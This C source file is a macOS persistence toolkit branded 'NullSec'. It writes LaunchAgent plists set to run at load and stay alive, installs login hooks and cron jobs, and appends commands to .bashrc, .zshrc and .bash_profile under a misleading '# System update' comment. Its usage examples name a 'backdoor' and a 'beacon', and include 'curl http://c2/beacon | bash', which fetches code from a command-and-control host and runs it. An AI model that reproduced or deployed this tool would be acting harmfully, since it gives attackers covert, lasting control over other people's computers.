/*
 * NullSec macOS Persistence Installer
 * Install various persistence mechanisms
 * Compile: clang -o nullsec-persist persist.c
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <pwd.h>

#define RED     "\033[0;31m"
#define GREEN   "\033[0;32m"
#define CYAN    "\033[0;36m"
#define RESET   "\033[0m"

void banner() {
    printf(CYAN);
    printf("\n╔═══════════════════════════════════════╗\n");
    printf("║   NullSec Persistence - macOS         ║\n");
    printf("║   Fast C-based persistence toolkit    ║\n");
    printf("╚═══════════════════════════════════════╝\n");
    printf(RESET);
}

int install_launch_agent(const char *name, const char *command) {
    char *home = getenv("HOME");
    char plist_path[512];
    snprintf(plist_path, sizeof(plist_path), 
             "%s/Library/LaunchAgents/com.%s.plist", home, name);
    
    // Create LaunchAgents directory if needed
    char dir[512];
    snprintf(dir, sizeof(dir), "%s/Library/LaunchAgents", home);
    mkdir(dir, 0755);
    
    FILE *f = fopen(plist_path, "w");
    if (!f) {
        printf(RED "[!] Failed to create plist\n" RESET);
        return -1;
    }
    
    fprintf(f, "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n");
    fprintf(f, "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n");
    fprintf(f, "<plist version=\"1.0\">\n");
    fprintf(f, "<dict>\n");
    fprintf(f, "    <key>Label</key>\n");
    fprintf(f, "    <string>com.%s</string>\n", name);
    fprintf(f, "    <key>ProgramArguments</key>\n");
    fprintf(f, "    <array>\n");
    fprintf(f, "        <string>/bin/bash</string>\n");
    fprintf(f, "        <string>-c</string>\n");
    fprintf(f, "        <string>%s</string>\n", command);
    fprintf(f, "    </array>\n");
    fprintf(f, "    <key>RunAtLoad</key>\n");
    fprintf(f, "    <true/>\n");
    fprintf(f, "    <key>KeepAlive</key>\n");
    fprintf(f, "    <true/>\n");
    fprintf(f, "</dict>\n");
    fprintf(f, "</plist>\n");
    fclose(f);
    
    printf(GREEN "[✓] LaunchAgent installed: %s\n" RESET, plist_path);
    printf("    Load with: launchctl load %s\n", plist_path);
    
    return 0;
}

int install_login_hook(const char *script_path) {
    char cmd[1024];
    snprintf(cmd, sizeof(cmd), 
             "defaults write com.apple.loginwindow LoginHook %s 2>/dev/null",
             script_path);
    
    int result = system(cmd);
    if (result == 0) {
        printf(GREEN "[✓] Login hook installed: %s\n" RESET, script_path);
    } else {
        printf(RED "[!] Login hook failed (may need root)\n" RESET);
    }
    return result;
}

int install_cron_job(const char *schedule, const char *command) {
    char cmd[2048];
    snprintf(cmd, sizeof(cmd),
             "(crontab -l 2>/dev/null; echo \"%s %s\") | crontab -",
             schedule, command);
    
    int result = system(cmd);
    if (result == 0) {
        printf(GREEN "[✓] Cron job installed: %s %s\n" RESET, schedule, command);
    }
    return result;
}

int install_bashrc_persistence(const char *command) {
    char *home = getenv("HOME");
    char paths[3][256];
    snprintf(paths[0], sizeof(paths[0]), "%s/.bashrc", home);
    snprintf(paths[1], sizeof(paths[1]), "%s/.zshrc", home);
    snprintf(paths[2], sizeof(paths[2]), "%s/.bash_profile", home);
    
    for (int i = 0; i < 3; i++) {
        FILE *f = fopen(paths[i], "a");
        if (f) {
            fprintf(f, "\n# System update\n%s &>/dev/null &\n", command);
            fclose(f);
            printf(GREEN "[✓] Added to: %s\n" RESET, paths[i]);
        }
    }
    return 0;
}

void list_persistence() {
    printf("\n[*] Current persistence mechanisms:\n\n");
    
    printf("    [LaunchAgents]\n");
    char *home = getenv("HOME");
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "ls -la %s/Library/LaunchAgents/ 2>/dev/null | tail -n +2", home);
    system(cmd);
    
    printf("\n    [Cron Jobs]\n");
    system("crontab -l 2>/dev/null || echo '    None'");
    
    printf("\n    [Login Hooks]\n");
    system("defaults read com.apple.loginwindow LoginHook 2>/dev/null || echo '    None'");
}

void usage(const char *prog) {
    printf("\nUsage: %s <option> [args]\n\n", prog);
    printf("Options:\n");
    printf("  -l, --list              List current persistence\n");
    printf("  -a, --agent NAME CMD    Install LaunchAgent\n");
    printf("  -c, --cron SCHED CMD    Install cron job\n");
    printf("  -s, --shell CMD         Add to shell rc files\n");
    printf("  -h, --hook SCRIPT       Install login hook (root)\n");
    printf("\nExamples:\n");
    printf("  %s -a backdoor '/path/to/payload'\n", prog);
    printf("  %s -c '*/5 * * * *' '/path/to/beacon'\n", prog);
    printf("  %s -s 'curl http://c2/beacon | bash'\n", prog);
}

int main(int argc, char *argv[]) {
    banner();
    
    if (argc < 2) {
        usage(argv[0]);
        return 1;
    }
    
    if (strcmp(argv[1], "-l") == 0 || strcmp(argv[1], "--list") == 0) {
        list_persistence();
    }
    else if ((strcmp(argv[1], "-a") == 0 || strcmp(argv[1], "--agent") == 0) && argc >= 4) {
        install_launch_agent(argv[2], argv[3]);
    }
    else if ((strcmp(argv[1], "-c") == 0 || strcmp(argv[1], "--cron") == 0) && argc >= 4) {
        install_cron_job(argv[2], argv[3]);
    }
    else if ((strcmp(argv[1], "-s") == 0 || strcmp(argv[1], "--shell") == 0) && argc >= 3) {
        install_bashrc_persistence(argv[2]);
    }
    else if ((strcmp(argv[1], "-h") == 0 || strcmp(argv[1], "--hook") == 0) && argc >= 3) {
        install_login_hook(argv[2]);
    }
    else {
        usage(argv[0]);
        return 1;
    }
    
    return 0;
}
